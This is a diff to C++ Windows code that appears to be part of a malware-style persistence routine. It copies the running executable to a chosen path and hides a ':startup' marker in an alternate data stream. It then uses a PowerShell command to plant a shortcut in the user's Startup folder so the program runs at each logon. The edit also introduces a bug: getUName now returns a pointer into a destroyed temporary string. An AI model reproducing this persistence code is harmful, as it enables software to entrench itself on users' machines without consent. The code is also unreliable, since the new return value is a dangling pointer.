@@ -27,11 +27,11 @@ bool access_(std::string path) {
     return true;
 }
 
-std::string getUName() {
+extern "C" const char* __cdecl getUName() {
     TCHAR username[UNLEN + 1];
     DWORD username_len = UNLEN + 1;
     GetUserName(username, &username_len);
-    return std::string(username);
+    return std::string(username).c_str();
 }
 
 extern "C" const char* __cdecl getSelfName() {
@@ -49,7 +49,7 @@ extern "C" int __cdecl moveSelfStartup(const char* path_, const char* sName_) {/
     std::string path = gsfcp(path_);
     std::string sName = gsfcp(sName_);
     if (isStartup()) { return 1; }//The current file is already processed by this code. (Alternate Data Stream detected)
-    std::string pStartup = "C:/Users/" + getUName() + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
+    std::string pStartup = "C:/Users/" + std::string(getUName()) + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/";
     std::string psCmd = "powershell.exe -Command \"& { Set-Location '" + pStartup + "'; $ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut($pwd.Path + '\\" + sName + ".lnk'); $s.TargetPath = '" + path + self + "'; $s.Save() }\"";
     std::string oneToRuleThemAll = "@echo off && type \"" + self + "\" >> \"" + path + self + "\" && echo check > \"" + path + self + ":startup\" && cd \"" + pStartup + "\" && " + psCmd;
 
